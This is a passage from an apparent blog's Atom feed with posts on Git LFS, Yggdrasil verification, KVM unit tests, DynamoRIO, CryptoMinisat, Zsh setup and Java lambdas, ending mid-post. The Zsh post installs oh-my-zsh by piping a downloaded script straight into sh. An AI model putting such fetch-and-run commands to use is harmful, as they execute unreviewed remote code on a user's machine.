      <category term="Machine Learning" scheme="http://home.meng.uno/categories/Machine-Learning/"/>
    
    
      <category term="机器学习" scheme="http://home.meng.uno/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="噪声" scheme="http://home.meng.uno/tags/%E5%99%AA%E5%A3%B0/"/>
    
  </entry>
  
  <entry>
    <title>Git Large File Storage</title>
    <link href="http://home.meng.uno/articles/c7ef6efe/"/>
    <id>http://home.meng.uno/articles/c7ef6efe/</id>
    <published>2018-01-21T02:22:44.000Z</published>
    <updated>2020-12-02T01:47:06.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>基本没有什么人不知道Git了吧，也没有多少人不知道GitHub，但是谈到GitHub如何存储大文件（100MB以上），又有多少人知道呢？</p></blockquote><p>今天，我要给大家介绍一种，不用分割文件即可实现让GitHub存储我们的大文件的方案 —— <code>Git Large File Storage</code>。</p><p>首先，给出官网：<a href="https://git-lfs.github.com/" target="_blank" rel="noopener">Git Large File Storage</a>。</p><p>使用方法：</p><ol>  <li>下载并安装：（Mac下：<code>brew install git-lfs</code>）</li>  <li>进入Git仓库，安装lfs：<code>git lfs install</code></li>  <li>设置要跟踪的大文件：<code>git lfs track &quot;*.file&quot;</code></li>  <li>添加<code>.gitattributes</code>进Git仓库：<code>git add .gitattributes</code></li>  <li>正常的Git提交到GitHub！</li></ol><p>其业务逻辑：</p><p><img src="http://www.meng.uno/images/git-lfs/1.png" alt=""></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c7ef6efe/">http://home.meng.uno/articles/c7ef6efe/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      基本没有什么人不知道Git了吧，也没有多少人不知道GitHub，但是谈到GitHub如何存储大文件（100MB以上），又有多少人知道呢？

今天，我要给大家介绍一种，不用分割文件即可实现让GitHub存储我们的大文件的方案 —— Git Large File Storage。

首先，给出官网：Git Large File Storage。

使用方法：

 1. 下载并安装：（Mac下：brew install git-lfs）
 2. 进入Git仓库，安装lfs：git lfs install
 3. 设置要跟踪的大文件：git lfs track &quot;*.file&quot;
 4. 添加.gita
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="git" scheme="http://home.meng.uno/tags/git/"/>
    
      <category term="超大文件" scheme="http://home.meng.uno/tags/%E8%B6%85%E5%A4%A7%E6%96%87%E4%BB%B6/"/>
    
      <category term="GitHub" scheme="http://home.meng.uno/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>Analysis for Yggdrasil</title>
    <link href="http://home.meng.uno/articles/5ed9f695/"/>
    <id>http://home.meng.uno/articles/5ed9f695/</id>
    <published>2018-01-16T14:31:00.000Z</published>
    <updated>2020-12-02T02:11:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>Yggdrasil is a toolkit for verifying file system with push-button verification via crash refinement. As for push-button verification, it means that Yggdrasil needs no manual annotations or proofs. As for crash refinement, it is amenable to fully automated  SMT reasoning. The whole verification is something like the State-Machine Specification in the project “Hyperkernel”.</p><p>The whole system architecture is shown as follows.</p><p><img src="http://www.meng.uno/images/yggdrasil/1.png" alt="Yggdrasil"></p><p>From this picture, we know that Yggdrasil needs three inputs: a specification of the expected behavior, an implementation and consistency invariants which indicate whether a file system image is in a consistent state or not. For better run-time performance,  Yggdrasil optionally performs optimizations. If there is a bug, Yggdrasil produces a counterexample to help identify and fix the cause. It requires no manual annotations or proofs about the implementation code. Once the verification passes, Yggdrasil  emits C code, which is then compiled and linked using a C compiler to produce an executable file system, as well as a “fsck” checker.</p><p>The above is the entire overall content of this project. The authors also introduced every part of this project. I will analyze it by following the paper.</p><h2 id="single-level-file-system-yminlfs">Single-level File System (YminLFS)</h2><p>In this project, every file system must contain three parts: an abstract data structure, a set of operations and a state equivalence predicate which defines whether a given implementation satisfies the specification. So the authors first defines a file  system which contains these features.</p><p><img src="http://www.meng.uno/images/yggdrasil/2.png" alt="Yggdrasil"></p><p><img src="http://www.meng.uno/images/yggdrasil/3.png" alt="Yggdrasil"></p><p><img src="http://www.meng.uno/images/yggdrasil/4.png" alt="Yggdrasil"></p><p><img src="http://www.meng.uno/images/yggdrasil/5.png" alt="Yggdrasil"></p><p>Then it runs the verification. Yggdrasil uses the Z3 solver to prove a two-part crash refinement.</p><p>The first part deals with crash-free executions which requires the implementation and specification are similar in the absence of crashes, which means if both YminLFS and FSSpec start in equivalent and consistent states, they end up in equivalent and  consistent states (just like state-machine). This project defines equivalence using the equivalent predicate and defines consistency using the consistency invariants as the above pictures show.</p><p>The second part deals with crash executions which requires the implementation to exist no more crash states than the specification, which means each possible state of the YminLFS implementation must be equivalent to some crash state of FSSpec. What’s  more, Yggdrasil provides a greedy optimizer that tries to remove every disk flush and re-verify the code.</p><h2 id="multi-level-file-system-yxv6">Multi-level File System (Yxv6)</h2><p>We could directly prove crash refinement between the entire file system specification and implementation in a single-level file system, however, we couldn’t use the same method in a complex multi-level file system. First, let’s look at the structure of  Yxv6 journaling file system.</p><p><img src="http://www.meng.uno/images/yggdrasil/6.png" alt="Yggdrasil"></p><p>This is the 5 layers of abstraction and every layer contains a specification and a implementation. The authors use this project to prove crash refinement for each layer and upper layers then use the specifications of lower layers. The lowest layer of  the stack is a specification of an asynchronous disk. This specification comprises the asynchronous disk model which is to implement YminLFS.</p><h2 id="application-level-ycp">Application-level (“Ycp”)</h2><p>Ycp has a formal specification which means if the copy operation succeeds, the result is the same as “cp”, however, if it fails, the file system is unchanged. To achieve this propose, the implementation of Ycp is something similar to Yxv6 file system  specification. There are 3 atomicity patterns which are “create a temporary file”, “write the source data to it” and “rename it to atomically create the target file”. After doing such an analogy, verifying this operation is similar to verify the single-level  file system.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5ed9f695/">http://home.meng.uno/articles/5ed9f695/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Yggdrasil is a toolkit for verifying file system with push-button verification via crash refinement. As for push-button verification, it means that Yggdrasil needs no manual annotations or proofs. As for crash refinement, it is amenable to fully automated SMT reasoning. The whole verification is som
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Yggdrasil" scheme="http://home.meng.uno/tags/Yggdrasil/"/>
    
      <category term="System Verification" scheme="http://home.meng.uno/tags/System-Verification/"/>
    
  </entry>
  
  <entry>
    <title>KVM Unit Tests</title>
    <link href="http://home.meng.uno/articles/50351d5d/"/>
    <id>http://home.meng.uno/articles/50351d5d/</id>
    <published>2018-01-15T14:19:40.000Z</published>
    <updated>2020-12-02T01:51:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>Kernel-based Virtual Machine (KVM) is a virtualization infrastructure for the Linux kernel that turns it into a hypervisor. KVM requires a processor with hardware virtualization extensions.</p><p>This project, as its name suggests, is to provide unit tests for KVM. The unit tests are tiny guest operating systems that generally execute only tens of lines of C and assembler test code in order to obtain its PASS/FAIL/SKIP result. Unit tests provide  KVM and virtual hardware functional testing by targeting the features through minimal implementations of their use per the hardware specification. The simplicity of unit tests make them easy to verify they are correct, easy to maintain, and easy to  use in timing measurements. Unit tests are also often used for quick and dirty bug reproducers.</p><h2 id="build-and-run">Build and Run</h2><p>Building this project is very easy, we just need to enter the directory and run “./configure; make”. If there isn’t any mistake, it means this project is successfully built. As can be seen from its name, it is a testing program so running it means running  some tests on KVM. In addition, as other verification systems, it also has some single test cases and a whole test suite. What has to be aware is we need to install “kvm” or “qemu-kvm” before testing, otherwise, the tests will just “SKIP” because it  is just for testing KVM.</p><p>First, I will run a single test case which is in the “x86/” directory named “syscall.flat”. The result is as follows.</p><p><img src="http://www.meng.uno/images/kvm/1.png" alt="KVM"></p><p>Then, I will run a test suite. The following picture is part of the result. I found that there are 3 status of the test results which are PASS, FAIL and SKIP.</p><p><img src="http://www.meng.uno/images/kvm/2.png" alt="KVM"></p><p>From the picture, we can see that not all tests are PASS, which means this version of KVM may have many points to be improved.</p><h2 id="analyze-the-test">Analyze the Test</h2><p>To write a test case/suite, we first need to analyze an example. From the file “run_tests.sh”, we could find that it runs each test in “x86/unittests.cfg”. This is a section of this file. From it, we could know that when the test suite runs to here, it  will find test case “apic.flat” and run it in the x86_64 architecture within 30 seconds.</p><p><img src="http://www.meng.uno/images/kvm/3.png" alt="KVM"></p><p>The result of every test case is printed to the screen by the “runtime.bash” script.</p><p><img src="http://www.meng.uno/images/kvm/4.png" alt="KVM"></p><p>What’s more, we could find the detailed information of every test case from “logs/” directory.</p><p><img src="http://www.meng.uno/images/kvm/5.png" alt="KVM"></p><p>After analyzing a test suite, let’s look at a single test case. I will choose the “syscall.flat” as an example. Let’s see the main function. There are two subfunctions which is consistent with the first screenshot.</p><p><img src="http://www.meng.uno/images/kvm/6.png" alt="KVM"></p><p>Now I will focus on a single function as the following picture shows. It just tests some single function calls and report the results.</p><p><img src="http://www.meng.uno/images/kvm/7.png" alt="KVM"></p><h2 id="write-a-test">Write A Test</h2><p>Because I can’t know about KVM clearly for such a short period of time, here I just write a simple test, in order to experience how to write a test case.</p><p><img src="http://www.meng.uno/images/kvm/8.png" alt="KVM"></p><p>After compiling and running it, we could get this expected output.</p><p><img src="http://www.meng.uno/images/kvm/9.png" alt="KVM"></p><p>Now I could put my test case to the test suite, adding such code to the “unittests.cfg” file.</p><p><img src="http://www.meng.uno/images/kvm/10.png" alt="KVM"></p><p>Also, it must be PASS as expected.</p><p><img src="http://www.meng.uno/images/kvm/11.png" alt="KVM"></p><h2 id="analyze-the-framework">Analyze the Framework</h2><p>In the beginning, let’s analyze the directory structure.</p><p><img src="http://www.meng.uno/images/kvm/12.png" alt="KVM"></p><ul>  <li>./api/: there are three API categories 1) libc, 2) functions typical of kernel code, and 3) kvm-unit-tests specific.</li>  <li>./lib/: general architecture neutral services for the tests.</li>  <li>./x86/: the sources of the tests and the created images of X86 architecture.</li>  <li>./logs/: the output information.</li>  <li>./scripts/: helper scripts for building and running tests.</li>  <li>others: configure script, top-level Makefile, and run_tests.sh.</li></ul><p>The framework has the following components:</p><ul>  <li>Test building support</li>  <li>Shared code for test setup and API</li>  <li>Test running support</li></ul><p>Test building is done through makefiles and some supporting bash scripts. Test setup code includes, for example, early system init, MMU enablement, and UART init. The API provides some common libc functions, as well as some low-level helper functions  commonly seen in kernel code and some kvm-unit-tests specific APIs. Test running is provided with a few bash scripts, using a unit tests configuration file as input. Generally tests are run from within the source root directory using the supporting  scripts, but tests may optionally be built as standalone tests as well.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/50351d5d/">http://home.meng.uno/articles/50351d5d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Kernel-based Virtual Machine (KVM) is a virtualization infrastructure for the Linux kernel that turns it into a hypervisor. KVM requires a processor with hardware virtualization extensions.

This project, as its name suggests, is to provide unit tests for KVM. The unit tests are tiny guest operating
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="KVM" scheme="http://home.meng.uno/tags/KVM/"/>
    
      <category term="Unit Test" scheme="http://home.meng.uno/tags/Unit-Test/"/>
    
  </entry>
  
  <entry>
    <title>Analysis for DynamoRIO</title>
    <link href="http://home.meng.uno/articles/a331aaad/"/>
    <id>http://home.meng.uno/articles/a331aaad/</id>
    <published>2018-01-13T13:57:16.000Z</published>
    <updated>2020-12-02T02:04:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>DynamoRIO is a dynamic binary piling/translation platform. Through it, you can manipulate the running code of a program, that is, it can simulate running a program and allow you to transform and control any place of the running code. It is used for dynamic  analysis, optimization and translation of programs.</p><p>DynamoRIO is a cooperation project between HP and MIT. Dynamo comes from HP’s laboratory, RIO (Runtime Introspection and Optimization) comes from MIT’s computer science laboratory. The history is shown as follows.</p><p><img src="http://www.meng.uno/images/rio/1.png" alt="RIO"></p><h2 id="architecture">Architecture</h2><p>DynamoRIO’s architecture is like this. It is between the operating system and the application so that it can get the system calls and the applications’ code easily.</p><p><img src="http://www.meng.uno/images/rio/2.png" alt="RIO"></p><p>This picture is the Toolchain Control Points.</p><p><img src="http://www.meng.uno/images/rio/3.png" alt="RIO"></p><p>The process flow is as follows. The original program goes through the “basic block builder”, “trace selector”, “basic block cache” and “trace cache” to get the emulation propose.</p><p><img src="http://www.meng.uno/images/rio/4.png" alt="RIO"></p><h2 id="efficiency">Efficiency</h2><p>DynamoRIO is separated from the code of applications by the “context switch” as shown in the picture above. The applications’ code is copied to the instruction cache. The code in these caches will execute as native code. Until a jump instruction is encountered,  the applications’ “machine state” will be saved, and the control will turn back to DynamoRIO to find the basic block where the jump instruction is located. DynamoRIO is much faster than pure emulations by “code cache”.</p><p><img src="http://www.meng.uno/images/rio/5.png" alt="RIO"></p><p>There are several improvements in this project. The picture above is the first one — Basic Block Cache. If you copy each basic block into a code cache and run it natively, it greatly reduces the overhead of interpreting, however, we still need to explain  each jump instruction, and then return to DynamoRIO to find the target instruction. If a target instruction already exists in the code cache and is referred to by a direct jump instruction, DynamoRIO can directly jump to the target instruction in the  code cache to avoid the overhead of the context switch, which is called “Linking Direct Branches”.</p><p><img src="http://www.meng.uno/images/rio/6.png" alt="RIO"></p><p>The next improvement is “Linking Indirect Branches” since a conditional branch instruction can not be linked like a direct jump instruction because it has more than one goal and needs to make decisions and find the list’s jump target.</p><p><img src="http://www.meng.uno/images/rio/7.png" alt="RIO"></p><p>Some basic blocks, which are often executed sequentially, are combined into one execution stream to reduce the number of branches and increase the locality of the program. It reduces some overhead of indirect branch search, because it has put indirect  brach in this trace as well. This is also the last improvement — Trace Building.</p><p><img src="http://www.meng.uno/images/rio/8.png" alt="RIO"></p><h2 id="transparency">Transparency</h2><p>It has three transparency principles which are “As few changes as possible”, “Hide necessary changes” and “Separate resources”. Changes in these areas are few: application code, stored addresses, threads and application data. Changes in these fields are  hidden: application addresses, address space, error transparency and code cache consistency. This picture shows the principle 3 well. DynamoRIO’s own code also uses share libraries when loading applications, which may cause some conflicts if the application  also uses the same library. The solution is that, DynamoRIO doesn’t use the library directly, calling system call on Linux and calling system call via windows win32 API profile.</p><p><img src="http://www.meng.uno/images/rio/9.png" alt="RIO"></p><p>The heap memory allocated by DynamoRIO itself is distinguished from the heap memory requested by the application. In addition, DynamoRIO uses its own I/O routines for input and output to avoid conflicts with the applications’ I/O buffers. What’s more,  since the use of shared locks can also cause conflicts between DynamoRIO and applications, it also has synchronization transparency.</p><p>To avoid conflicts with applications, DynamoRIO doesn’t create its own thread, instead spawns threads in the application process to distinguish between its own status and applications’ status via a “Context Switch” as the first picture shows. Further  more, it chooses to leave the stack of application processes intact, creating a private stack of each thread.</p><h2 id="comprehensive">Comprehensive</h2><p>All data streams must go through handlers generated by the dispatcher. The data flow is like this.</p><p><img src="http://www.meng.uno/images/rio/10.png" alt="RIO"></p><h2 id="customization">Customization</h2><p>DynamoRIO has developed some event driven APIs that allow developers to customize instrument instructions. Using it, you can achieve some proposes such as: memory checking, performance testing, system call tracking, code coverage calculation.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/a331aaad/">http://home.meng.uno/articles/a331aaad/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      DynamoRIO is a dynamic binary piling/translation platform. Through it, you can manipulate the running code of a program, that is, it can simulate running a program and allow you to transform and control any place of the running code. It is used for dynamic analysis, optimization and translation of p
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="DynamoRIO" scheme="http://home.meng.uno/tags/DynamoRIO/"/>
    
      <category term="RIO" scheme="http://home.meng.uno/tags/RIO/"/>
    
  </entry>
  
  <entry>
    <title>Zsh</title>
    <link href="http://home.meng.uno/articles/d911b12b/"/>
    <id>http://home.meng.uno/articles/d911b12b/</id>
    <published>2018-01-11T02:22:44.000Z</published>
    <updated>2020-12-02T02:12:19.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>不少程序员都觉得Mac的一大优势就是其Shell，也有很多人觉得Mac与Linux在Shell上很相似。不错，但是Mac还是略胜一筹或者说高一个量级。今天，我将向大家介绍一个Mac特有的Shell（Linux也可以安装，但是不是系统自带。）—— Zsh。</p></blockquote><h2 id="切换到zsh">切换到Zsh</h2><p>使用<code>cat /etc/shells</code>指令，我们可以看看自己的系统有哪些Shells，下面是我的Mac的结果：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/bin/bash</span><br><span class="line">/bin/csh</span><br><span class="line">/bin/ksh</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/tcsh</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/local/bin/fish</span><br></pre>      </td>    </tr>  </table></figure><p>使用这个指令切换到Zsh：<code>chsh -s /bin/zsh</code>。（想使用其他Shell也是同样的指令哦。）</p><p>这是，我们的Shell配置文件就为<code>.zshrc</code>了。</p><blockquote>  <p>我觉得从这里我们应该可以知道，为什么之前的Shell配置文件要以<code>.bash_profile</code>命名了吧。因为Mac默认Shell是Bash。</p></blockquote><h2 id="迁移bash配置">迁移Bash配置</h2><p>我使用Bash有好几年了，那些配置都是一些环境变量啊什么的，如果在Zsh的配置里再写一遍，无疑是一件很费时又低效的事。那有没有什么快捷的方式呢？当然有！</p><p>通过如下指令：<code>source ~/.bash_profile</code>就可以将<code>.bash_profile</code>里的配置全部引入到<code>.zshrc</code>中了。同理，如果你想自己写配置，也可以通过这种方式引入。（后文你将看到一个第三方工具就是这么做的。）</p><h2 id="安装oh-my-zsh">安装oh my zsh</h2><p>通过<code>wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</code>指令安装。</p><p>这时我们发现在<code>.zshrc</code>文件中，多了两行：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">export ZSH=/Users/NAME/.oh-my-zsh</span><br><span class="line">source <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br></pre>      </td>    </tr>  </table></figure><h2 id="自定义shell主题">自定义Shell主题</h2><p>使用oh my zsh主要的原因是使用其提供的漂亮的主题，主题目录在<code>.oh-my-zsh/themes/</code>下，选择主题<code>ZSH_THEME=&quot;robbyrussell&quot;</code>。这时我的Shell主题就是robbyrussell了。</p><p>打开robbyrussell.zsh-theme文件，我们可以看见几条配置。</p><p>我将其中的<code>PROMPT</code>修改为：</p><p><code>PROMPT='${ret_status} %{$fg[cyan]%}%d %{$reset_color%} $(git_prompt_info)%{$fg_bold[red]%}&gt;%{$fg_bold[yellow]%}&gt;%{$fg_bold[green]%}&gt; '</code></p><p>这时我的Shell就变成了这样：</p><p><img src="http://www.meng.uno/images/zsh.png" alt="Zsh"></p><p>可以发现我的定制有：显示绝对路径，<code>&gt;&gt;&gt;</code>等。</p><p>还有很多主题与配置，大家可以自己尝试。</p><h2 id="定制shell">定制Shell</h2><p>Zsh还有个功能就是“别名”。不知道大家有没有这样的经历，需要打开<code>.plist</code>这样的文件，如果用普通编辑器打开会非常界面不友好，而用Xcode打开则完美可观。那怎么在控制台直接用Xcode打开文件呢？（其他软件同理）</p><p>我在<code>.zshrc</code>中添加：<code>alias xcode=&quot;/Applications/Xcode.app/Contents/MacOS/Xcode&quot;</code>，之后我就可以使用<code>xcode X</code>来用Xcode打开X文件了。</p><p>我们也可以为某种类型文件设置默认打开方式：<code>alias -s html=atom</code>（当我们键入<code>.html</code>文件时，会自动用Atom打开）。</p><h2 id="安装插件">安装插件</h2><p>oh my zsh为Zsh提供了100+插件，如果我们需要安装某插件，只需要在<code>.zshrc</code>文件中的<code>plugins=()</code>中添加，用空格隔开，只需要填插件名字，默认添加了<code>git</code>。</p><p>在这里我向大家介绍几种网上很常见的插件：</p><ol>  <li><code>git</code>当你处于一个 git 受控的目录下时，Shell 会明确显示 「git」和 branch，如上图所示，另外对 git 很多命令进行了简化，例如 gco=’git checkout’、gd=’git diff’、gst=’git status’、g=’git’等等，熟练使用可以大大减少 git 的命令长度，命令内容可以参考~/.oh-my-zsh/plugins/git/git.plugin.zsh。</li>  <li><code>osx</code>tab 增强，quick-look filename 可以直接预览文件，man-preview grep 可以生成 grep手册 的pdf 版本等。</li>  <li><code>autojump</code>像他的名字一样，提供自动补全等很多功能，大家自己去尝试吧。</li></ol><p><strong>注意：安装autojump建议使用Homebrew</strong></p><p><code>brew install autojump</code></p><p>然后按照提示将一句类似这个</p><p><code>[ -f /usr/local/etc/profile.d/autojump.sh ] &amp;&amp; . /usr/local/etc/profile.d/autojump.sh</code></p><p>的句子插入到<code>.zshrc</code>文件中即可。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/d911b12b/">http://home.meng.uno/articles/d911b12b/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      不少程序员都觉得Mac的一大优势就是其Shell，也有很多人觉得Mac与Linux在Shell上很相似。不错，但是Mac还是略胜一筹或者说高一个量级。今天，我将向大家介绍一个Mac特有的Shell（Linux也可以安装，但是不是系统自带。）—— Zsh。

切换到Zsh
使用cat /etc/shells指令，我们可以看看自己的系统有哪些Shells，下面是我的Mac的结果：

1
2
3
4
5
6
7


/bin/bash
/bin/csh
/bin/ksh
/bin/sh
/bin/tcsh
/bin/zsh
/usr/local/bin/fish


使用这个指令切换到Zsh：chs
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Shell" scheme="http://home.meng.uno/tags/Shell/"/>
    
      <category term="Zsh" scheme="http://home.meng.uno/tags/Zsh/"/>
    
  </entry>
  
  <entry>
    <title>Deep Learning上手工具</title>
    <link href="http://home.meng.uno/articles/99be2c50/"/>
    <id>http://home.meng.uno/articles/99be2c50/</id>
    <published>2018-01-10T14:43:43.000Z</published>
    <updated>2020-12-02T02:08:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>现在Deep Learning太火了，以至于没有任何计算机基础的人都想使用它，那么对于新手，甚至连Python代码都写不好的DL爱好者，有什么上手工具么？选择合适的工具可以帮助学习更快，很巧的是，有很多不同的工具可供选择，下图列出了常用的工具。</p><p><img src="http://www.meng.uno/images/tools_dp.png" alt="DL"></p><p>谷歌开发的<code>Tensorflow</code>，微软的<code>CNTK</code>以及<code>Theano</code>都是为深度学习而开发的库，它们促进了使用<code>GPU</code>计算。他们并不难，但与<code>Keras</code>相比，他们仍然非常复杂。<code>Keras</code>只是使用底层深度学习库的界面。使用<code>Keras</code>就像玩乐高一样简单。我建议初学者从<code>Keras</code>开始，因为我们可以快速了解深度学习可以做些什么，并积极进行一些有趣的项目。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/99be2c50/">http://home.meng.uno/articles/99be2c50/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      现在Deep Learning太火了，以至于没有任何计算机基础的人都想使用它，那么对于新手，甚至连Python代码都写不好的DL爱好者，有什么上手工具么？选择合适的工具可以帮助学习更快，很巧的是，有很多不同的工具可供选择，下图列出了常用的工具。



谷歌开发的Tensorflow，微软的CNTK以及Theano都是为深度学习而开发的库，它们促进了使用GPU计算。他们并不难，但与Keras相比，他们仍然非常复杂。Keras只是使用底层深度学习库的界面。使用Keras就像玩乐高一样简单。我建议初学者从Keras开始，因为我们可以快速了解深度学习可以做些什么，并积极进行一些有趣的项目。



本文
    
    </summary>
    
      <category term="Deep Learning" scheme="http://home.meng.uno/categories/Deep-Learning/"/>
    
    
      <category term="Deep Learning" scheme="http://home.meng.uno/tags/Deep-Learning/"/>
    
      <category term="上手工具" scheme="http://home.meng.uno/tags/%E4%B8%8A%E6%89%8B%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>CryptoMinisat</title>
    <link href="http://home.meng.uno/articles/7d26fe8/"/>
    <id>http://home.meng.uno/articles/7d26fe8/</id>
    <published>2018-01-10T13:50:36.000Z</published>
    <updated>2020-12-02T01:44:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Inspired by other verification system projects, I want to further explore the means of verification they used such as SMT solver, SAT solver, Coq and so on. I’ll start with this report from an advanced SAT solver — CryptoMinisat. (I have written a report  about STP which is a SMT solver.)</p><p>The Boolean Satisfiability Problem (SAT for short) is the problem of determining if there exists an interpretation that satisfies a given boolean formula. In other words, it asks whether the variables of a given boolean formula can be consistently replaced  by the values TRUE or FALSE in such a way that the formula evaluates to TRUE. If this is the case, the formula is called satisfiable. Otherwise, the formula is unsatisfiable.</p><p>SAT solvers have recently been enjoying a boom in the application front: more and more applications can and do make use of SAT solvers to accomplish tasks ranging from the fairly trivial to the very complex. The benefit of the incredible improvements  in the design of efficient SAT solvers those recent years is now reaching our lives: The Intel Core7 processor for instance has been designed with the help of SAT technology, while the device drivers of Windows 7 are being certified thanks to an SMT  solver (based on a SAT solver).</p><h2 id="build-and-test">Build and Test</h2><p>This is the 5th version of CryptoMinisat which means the install instruction is very prefect now. To build and test this project, all we have to do is following the instruction. Firstly, we need to install many dependencies. Then, it is very simple to  build by “make”. The following is part of the output.</p><p><img src="http://www.meng.uno/images/cryptominisat/1.png" alt="CryptoMinisat"></p><p>Testing this project is very easy by the script written by the authors. Typing “make test” and waiting for a moment, we will get this output which means the tests are correct.</p><p><img src="http://www.meng.uno/images/cryptominisat/2.png" alt="CryptoMinisat"></p><h2 id="run-this-project">Run This Project</h2><p>This is a very mature project which can be run from the terminal or used as a C++/Python library. In this report, I just choose the first way.</p><p>As I said before, this project is a SAT solver which means it could find out the situations which fulfill the input or return error. The grammar is very simple just like this.</p><p><img src="http://www.meng.uno/images/cryptominisat/3.png" alt="CryptoMinisat"></p><p>The first line means this input has 2 variables and 4 clauses. Every line is a clause which is ended by “0”. Using the third line as an example, it says that 2 is TRUE and 3 is FALSE. I use this file as an input and run it in the terminal. The result  is shown as follows. It means 1 is TRUE, 2 and 3 are FALSE is the only solution to this problem.</p><p><img src="http://www.meng.uno/images/cryptominisat/4.png" alt="CryptoMinisat"></p><p>This is another example and the result.</p><p><img src="http://www.meng.uno/images/cryptominisat/5.png" alt="CryptoMinisat"></p><p><img src="http://www.meng.uno/images/cryptominisat/6.png" alt="CryptoMinisat"></p><p>It means there isn’t a solution to this problem.</p><h2 id="how-it-works">How It Works</h2><p>There are many improvements and techniques included in this project. It uses “Minisat” as its core and uses Gaussian Elimination on top-level. This is another part of its techniques.</p><ul>  <li>Variable elimination and replacement, strengthening and subsumption;</li>  <li>Gate-based clause shortening and removal;</li>  <li>No time or memory-outs on weird CNFs;</li>  <li>Variable renumbering and variable number hiding. due to this, XOR clauses are cut and the added variables are always consistently displayed;</li>  <li>Temporary results are stored in SQLite which supports high speed update;</li>  <li>XOR recovery.</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7d26fe8/">http://home.meng.uno/articles/7d26fe8/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Inspired by other verification system projects, I want to further explore the means of verification they used such as SMT solver, SAT solver, Coq and so on. I’ll start with this report from an advanced SAT solver — CryptoMinisat. (I have written a report about STP which is a SMT solver.)

The Boolea
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="CryptoMinisat" scheme="http://home.meng.uno/tags/CryptoMinisat/"/>
    
      <category term="SAT" scheme="http://home.meng.uno/tags/SAT/"/>
    
      <category term="solver" scheme="http://home.meng.uno/tags/solver/"/>
    
  </entry>
  
  <entry>
    <title>Java中的Lambda表达式</title>
    <link href="http://home.meng.uno/articles/1eac83ce/"/>
    <id>http://home.meng.uno/articles/1eac83ce/</id>
    <published>2018-01-04T06:16:45.000Z</published>
    <updated>2020-12-02T01:52:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1>Lambda表达式</h1><p>要理解lambda表达式，首先要了解的是函数式接口（functional interface）。简单来说，函数式接口是只包含一个抽象方法的接口。比如Java标准库中的<a href="http://download.java.net/jdk8/docs/api/java/lang/Runnable.html" target="_blank" rel="noopener">java.lang.Runnable</a>和<a href="http://download.java.net/jdk8/docs/api/java/util/Comparator.html" target="_blank" rel="noopener">java.util.Comparator</a>都是典型的函数式接口。对于函数式接口，除了可以使用Java中标准的方法来创建实现对象之外，还可以使用lambda表达式来创建实现对象。这可以在很大程度上简化代码的实现。在使用lambda表达式时，只需要提供形式参数和方法体。由于函数式接口只有一个抽象方法，所以通过lambda表达式声明的方法体就肯定是这个唯一的抽象方法的实现，而且形式参数的类型可以根据方法的类型声明进行自动推断。</p><p>在工作中创建一个线程的写法如下：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public void runThread() &#123;</span><br><span class="line">    new Thread(new Runnable() &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            System.out.println(&quot;test&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).start();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><code>Java 8</code> 中 <code>Lambda</code> 表达式一般格式：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">(argument) -&gt; &#123;body&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>argument表示的是方法中的形式参数，如果没有直接放空，后面的body是方法体。</p><p>所以第一个Demo中的代码可以简化如下:</p><figure class="highlight plain">  